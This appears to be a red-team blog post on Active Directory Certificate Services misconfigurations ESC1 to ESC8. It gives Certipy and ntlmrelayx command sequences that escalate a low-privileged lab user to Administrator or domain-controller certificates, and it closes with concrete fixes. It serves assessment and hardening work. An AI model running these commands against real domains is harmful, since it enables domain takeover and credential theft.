---
title: "Active Directory Certificate Services: ESC1 Through ESC8 in Practice"
date: 2024-12-18
draft: false
tags: ["ADCS", "Active Directory", "Certipy", "PKINIT", "Privilege Escalation"]
categories: ["Red Team"]
summary: "Why certificate services are the most reliable escalation path in enterprise AD, and the eight misconfigurations worth checking on every engagement."
---

AD CS is the escalation path that catches organisations off guard, because the vulnerable configuration looks like normal administration. A template that lets requesters supply a subject name is not a bug in the software — it's a policy decision someone made in 2014 and nobody revisited.

The ESC numbering comes from the original research by SpecterOps. If you find a CA in an environment, the first hour of your assessment should be spent walking this list.

## ESC1: Enrollee supplies subject

The classic. A template that:

- permits **enrollee-supplied subject** (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`)
- has a **Client Authentication** or **Smart Card Logon** EKU
- grants **Enrollment** rights to a low-privileged principal

requesting a certificate as `Administrator` gets you a certificate that authenticates as the Administrator. Domain compromise from any user who can enrol.

```bash
certipy-ad find -u jdoe@lab.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable -enabled

certipy-ad req -u jdoe@lab.local -p 'Password123!' -ca LAB-CA \
  -template VulnTemplate -upn administrator@lab.local

certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

That last command returns the Administrator's NT hash.

## ESC2: Any Purpose EKU

Same shape, different mechanism. A template with the **Any Purpose** EKU (`2.5.29.37.0`) accepts the certificate for any use, including client authentication. No subject-name control needed for the client-auth case.

## ESC3: Enrollment agent

An **Enrollment Agent** template lets a delegated user request certificates on behalf of *another* user. If the agent certificate can be issued to a low-privileged account, that account can enrol as anyone:

```bash
certipy-ad req -u jdoe@lab.local -p 'Password123!' -ca LAB-CA -template EnrollmentAgent
certipy-ad req -u jdoe@lab.local -p 'Password123!' -ca LAB-CA \
  -template User -on-behalf-of 'lab\administrator' -pfx jdoe.pfx
```

## ESC4: Writable template ACLs

The template object itself is writable by a non-privileged principal. You don't need a misconfigured template — you *make* one:

```bash
certipy-ad template -u jdoe@lab.local -p 'Password123!' -template SafeTemplate -save-old
certipy-ad template -u jdoe@lab.local -p 'Password123!' -template SafeTemplate \
  -write-default-configuration
# Now it's ESC1 — enrol as Administrator, then restore
certipy-ad template -u jdoe@lab.local -p 'Password123!' -template SafeTemplate -restore
```

Restoring afterwards matters on an engagement: leaving a template modified is a production change you didn't ask for.

## ESC5 and ESC6

**ESC5** is control over the CA object or its container in AD — a broader ACL problem that often amounts to ESC4 with extra steps.

**ESC6** is the CA-level flag `EDITF_ATTRIBUTESUBJECTALTNAME2`, which allows a subject alternative name to be supplied in *any* request, regardless of template settings. Check the CA configuration:

```bash
certipy-ad find -u jdoe@lab.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable
```

## ESC7 and ESC8

**ESC7** is `ManageCA` or `ManageCertificates` rights on the CA, which let you approve pending requests or modify CA settings — an indirect route to issuing arbitrary certificates.

**ESC8** is the one that pairs with NTLM relay. If the CA publishes an HTTP enrollment endpoint and NTLM is not blocked, you can relay a coerced machine authentication to the enrollment service and receive a certificate for that machine:

```bash
impacket-ntlmrelayx -t http://ca.lab.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

Against a domain controller, the resulting certificate lets you request a ticket as the DC — which is effectively game over.

## Fixes that actually work

- **Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** from any template where it isn't required. Where it is required, gate enrollment to a small group.
- **Audit template ACLs.** Nobody should have Write permissions on a template except CA administrators.
- **Remove Any Purpose and the certificate-request-agent EKUs** unless there is a documented use case.
- **Require CA manager approval** for sensitive templates — this breaks every auto-issue path above.
- **Enable Extended Protection for Authentication and disable HTTP enrollment**, or at minimum require HTTPS plus channel binding.
- **Turn off `EDITF_ATTRIBUTESUBJECTALTNAME2`** on the CA.

## Why this matters more than the average finding

Certificate-based escalation survives password resets. If you have a valid client-auth certificate for an account, changing that account's password does nothing to it. The certificate remains valid until it expires.

Which means the response to a suspected AD CS compromise is not "reset the password". It is "revoke the certificate, and find out how many other certificates were issued that shouldn't have been".
